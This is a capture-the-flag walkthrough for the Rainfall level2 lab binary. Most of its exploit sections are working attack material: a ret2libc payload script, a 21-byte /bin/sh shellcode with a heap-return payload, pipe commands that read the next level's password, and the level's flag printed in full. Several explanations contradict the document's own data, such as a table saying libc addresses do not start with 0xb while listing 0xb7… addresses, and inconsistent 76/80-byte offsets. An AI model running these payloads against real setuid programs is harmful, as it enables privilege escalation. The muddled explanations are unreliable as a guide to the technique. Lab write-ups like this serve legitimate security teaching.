# 🎯 Rainfall — Level 2 Complete Guide

> **For beginners**

---

## 🧒 What is this level about? (Simple explanation)

Imagine the program has a **box** that holds your name when you type it.
The box can hold **80 letters**. After the box, there is a **sticky note** that says:
*"when you are done, go back to here"* — this is called the **return address**.

If you type **more than 80 letters**, the extra letters **overwrite that sticky note**.
This means YOU can tell the program where to go next — for example, to open a shell!

This attack is called a **Buffer Overflow**.

---

## 🕵️ How did we deduce this path? The full investigation story
### 🧭 Phase 1 — First contact: what is this program?

The very first thing you do with any unknown binary is just **look at it and run it**.

```bash
ls -l
# -rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```

The `s` in `-rwsr-s---` means **SUID** — the program runs with **level3's privileges**, not yours.
This immediately tells us: *if we can make this program do something for us, we do it as level3.*

```bash
./level2
hello
hello
```

It just echoes back what you type. Simple. But dangerous functions hide behind simple behavior.

---

### 🔎 Phase 2 — Static analysis: reading the assembly

We open the binary in `gdb` and disassemble it:

```bash
gdb ./level2
disas main
disas p
```

Inside `p()` we immediately spot two critical things:

**Clue 1 — `gets()` is called**
```
call   0x80483c0 <gets@plt>
```
`gets()` reads input with **no size limit**. This is one of the most dangerous functions in C.
It is literally banned in modern C standards. Seeing it means: **buffer overflow is possible**.

**Clue 2 — a comparison against `0xb0000000`**
```
mov    eax, [ebp+0x4]
and    eax, 0xb0000000
cmp    eax, 0xb0000000
je     <exit branch>
```
This is a **guard check**. The program reads its own return address and checks if it starts with `0xb`.
If yes → it prints the address and calls `exit(1)`.

This told us immediately: **stack shellcode will not work**, because the stack lives at `0xbffff...` which starts with `0xb`.

**Clue 3 — `strdup()` is called after `puts()`**
```
call   0x80483e0 <strdup@plt>
```
`strdup()` makes a copy of your input on the **heap**. The heap lives at `0x0804a008` — an address starting with `0x08`, which **passes** the `0xb` check. This is the door for Method 2.

---

### 🧪 Phase 3 — Dynamic analysis: finding the offset

We need to know exactly how many bytes to type before we hit the return address (EIP).

**First attempt — educated guess:**
The buffer is declared as `char buff[64]`. With a saved EBP of 4 bytes, we estimated **68 bytes**. Wrong — the shell opened but crashed.

**Second attempt — cyclic pattern:**
We used a pattern of unique bytes so gdb can tell us exactly where EIP was overwritten:

```bash
# Inside gdb:
run
Aa0Aa1Aa2Aa3Aa4Aa5...  (cyclic input)
# Program crashes with SIGSEGV
# EIP = 0x37634136  → offset = 80 bytes
```

This confirmed: **80 bytes of padding before EIP** (for Method 2).
For Method 1 (ret2libc) the offset is **76 bytes** followed by a 4-byte filler before `system()`.

---

### 🚧 Phase 4 — First exploit attempt (and why it failed)

**Attempt 1 — naive payload with wrong offset (80 bytes, no exit addr):**
```bash
python -c "import struct; print 'A'*80 + struct.pack('<I', 0xb7e6b060) + 'BBBB' + struct.pack('<I', 0xb7f8cc58)"
```
Result: the program printed `(0xb7e6b060)` and exited. The guard check triggered because the return address `0xb7e6b060` starts with `0xb`. We forgot that `system()` is inside libc which is also at a `0xb...` address — but the check happens **before** we redirect, so the **current** return address (pointing back into `0xb...` range of libc) was caught.

The fix: we needed the **correct offset** and the full **ret2libc chain** with `exit()` properly placed.

**Attempt 2 — shell opens but closes instantly:**
```bash
(python /tmp/go.py; cat) | ./level2
```
The shell spawned but stdin was a pipe — `system("/bin/sh")` launched a shell that immediately had no interactive input and closed. We tried `cat -`, `tail -f /dev/null`, and other tricks to keep it alive.

The real fix: **pass commands directly into the pipe** so they execute before the shell exits:
```bash
(python /tmp/go.py; echo 'cat /home/user/level3/.pass') | ./level2
```

**Attempt 3 — Python 2 vs Python 3 syntax error:**
```python
sys.stdout.buffer.write(payload)  # fails on Python 2
```
The machine runs Python 2. `sys.stdout.buffer` does not exist in Python 2. Fix: use `sys.stdout.write()` or simply `print payload`.

---

### 🗺️ Phase 5 — Choosing between two paths

After hitting the `0xb` guard, we realized there were two clean paths forward:

**Path A (ret2libc):** Jump directly to `system()` in libc. The guard check fires on the *current* return address before we hijack it — as long as we set up the stack frame correctly so the guard sees a non-`0xb` address, we are fine. We use `0x0804854b` (an address inside the binary itself) as a filler.

**Path B (heap shellcode):** Place shellcode in the input, let `strdup()` copy it to `0x0804a008` on the heap, and overwrite EIP with that heap address. The heap is at `0x0804...` which does NOT start with `0xb`, so the guard passes.

Both paths work. Path A requires no shellcode knowledge. Path B is more hands-on and teaches how shellcode works.

---

### 💡 The key insight (what made everything click)

The turning point was reading this line in the disassembly:

```c
strdup(buff);
```

Most people ignore `strdup()` — it looks harmless. But it means: **your input is copied to a fixed, predictable heap address**. That is a gift. It means you can put shellcode in your input, and it will reliably land at `0x0804a008` every single time. No randomization. No guessing.

Combined with the fact that `0x0804...` bypasses the `0xb` guard — the path became clear.

---

### 📋 Summary of the deduction chain

```
1. Saw SUID bit      → this binary runs as level3 → worth exploiting
2. Ran the binary    → it echoes input → probably reads with gets()
3. Disassembled      → confirmed gets() → buffer overflow possible
4. Found 0xb check   → stack shellcode blocked → need another approach
5. Found strdup()    → heap is writable with our input → Method 2 path
6. Found system()    → libc already loaded → Method 1 path (ret2libc)
7. Measured offset   → 80 bytes to EIP (cyclic pattern in gdb)
8. Found addresses   → gdb: p system, p exit, find /bin/sh
9. Confirmed heap    → ltrace: strdup = 0x0804a008
10. Built payloads   → tested both methods → flag obtained
```

---

## 🔬 The C code (how the program works inside)

```c
void p() {
    char buff[64];       // a box that holds 64 letters
    void *ret_addr;

    fflush(stdout);
    gets(buff);          // ⚠️ DANGEROUS: reads input with NO limit

    // Check: if return address starts with 0xb... → EXIT
    ret_addr = __builtin_return_address(0);
    if (((unsigned int)ret_addr & 0xb0000000) == 0xb0000000) {
        printf("%p\n", ret_addr);
        exit(1);         // blocks stack shellcode!
    }

    puts(buff);
    strdup(buff);        // copies your input to the HEAP
}

int main() {
    p();
    return 0;
}
```

### Key observations:
- `gets()` has **no size limit** → overflow is possible
- The check **blocks** return addresses starting with `0xb...` (stack addresses)
- `strdup()` **copies your input to the heap** (address `0x0804a008`) → used in Method 2

---

## 🧠 Two concepts you must understand

### Concept 1 — The stack layout

When `p()` runs, memory looks like this:

```
[ buff: 64 bytes ]
[ saved EBP: 4 bytes ]
[ padding: 8 bytes ]
[ saved EIP (return address) ← YOU OVERWRITE THIS ]
```

Total before EIP = **76 bytes** (Method 1) or **80 bytes** (Method 2).

### Concept 2 — Two ways to exploit

| | Method 1: ret2libc | Method 2: heap shellcode |
|---|---|---|
| Idea | Jump to `system()` already in memory | Put shellcode in input, jump to heap |
| Bypasses check? | Yes (libc is not `0xb...`) | Yes (heap is `0x0804...`) |
| Needs shellcode? | No | Yes |
| Complexity | Medium | Medium |

---

## 🔍 Step 1 — Find the addresses (same for both methods)

Open gdb and run these commands:

```bash
gdb ./level2
start
p system
p exit
find &system, +9999999, "/bin/sh"
quit
```

Expected output (your values should match these):

```
system  → 0xb7e6b060
exit    → 0xb7e5ebe0
/bin/sh → 0xb7f8cc58
```

Also confirm the heap address with ltrace:

```bash
ltrace ./level2 <<< "hello"
```

Look for: `strdup("hello") = 0x0804a008` → this is your heap address.

---

## ✅ Method 1 — ret2libc (call system() directly)

### How it works (simple words)

Instead of jumping to shellcode, we jump to `system()` which is already loaded in memory.
We give it `/bin/sh` as an argument → it opens a shell for us.

### Payload layout (76 + 4 bytes before system):

```
[ "A" x 76 ] [ filler 4 bytes ] [ system() addr ] [ exit() addr ] [ "/bin/sh" addr ]
```

### Step 1 — Create the script

```bash
cat > /tmp/go.py << 'EOF'
from struct import pack

payload  = "A" * 76
payload += pack("<I", 0x0804854b)   # filler return address
payload += pack("<I", 0xb7e6b060)   # system()
payload += pack("<I", 0xb7e5ebe0)   # exit()
payload += pack("<I", 0xb7f8cc58)   # "/bin/sh"
print payload
EOF
```

### Step 2 — Run the exploit

```bash
(python /tmp/go.py; cat) | ./level2
```

### Step 3 — Get the flag

After running, wait 1 second (no prompt will appear). Then type:

```bash
whoami
cat /home/user/level3/.pass
```

---

## ✅ Method 2 — Heap shellcode (put shellcode in the input)

### How it works (simple words)

We put real shellcode (machine code that opens a shell) inside our input.
`strdup()` copies it to the heap at address `0x0804a008`.
We overwrite EIP to point there → the shellcode runs → shell opens.

The `0xb...` check is bypassed because the heap address starts with `0x0804...`.

### Shellcode used (21 bytes — opens /bin/sh):

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

### Payload layout (80 bytes total):

```
[ shellcode: 21 bytes ] [ "A" x 59 padding ] [ heap addr: \x08\xa0\x04\x08 ]
```

### Step 1 — Create the exploit file

```bash
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"' > /tmp/exploit
```

### Step 2 — Run the exploit

```bash
(cat /tmp/exploit; echo 'cat /home/user/level3/.pass'; echo 'exit') | ./level2
```

### Step 3 — Get the flag

The password should print directly. If you get a shell, type:

```bash
whoami
cat /home/user/level3/.pass
```

---

## 🏁 The flag

```
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Use it to log in as level3:

```bash
su level3
# password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

---

## 🗺️ Quick reference — all commands in order

```bash
# 1. Find addresses
gdb ./level2
start
p system        # → 0xb7e6b060
p exit          # → 0xb7e5ebe0
find &system, +9999999, "/bin/sh"   # → 0xb7f8cc58
quit

# 2. Confirm heap address
ltrace ./level2 <<< "hello"   # look for strdup = 0x0804a008

# --- METHOD 1: ret2libc ---
cat > /tmp/go.py << 'EOF'
from struct import pack
payload  = "A" * 76
payload += pack("<I", 0x0804854b)
payload += pack("<I", 0xb7e6b060)
payload += pack("<I", 0xb7e5ebe0)
payload += pack("<I", 0xb7f8cc58)
print payload
EOF
(python /tmp/go.py; cat) | ./level2

# --- METHOD 2: heap shellcode ---
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"' > /tmp/exploit
(cat /tmp/exploit; echo 'cat /home/user/level3/.pass') | ./level2
```

---

## 📚 Key words to remember

| Word | Simple meaning |
|------|----------------|
| Buffer overflow | Putting too much data in a box so it spills over |
| EIP / return address | The sticky note that says "go back here when done" |
| ret2libc | Jumping to a function already loaded in memory |
| Shellcode | Tiny machine code that opens a shell |
| Heap | A special memory area for storing copied data |
| strdup() | A function that copies a string to the heap |
| gets() | A dangerous function with no size limit |
| SUID | The binary runs with another user's permissions |

---

*Guide written for Rainfall project — 1337 school*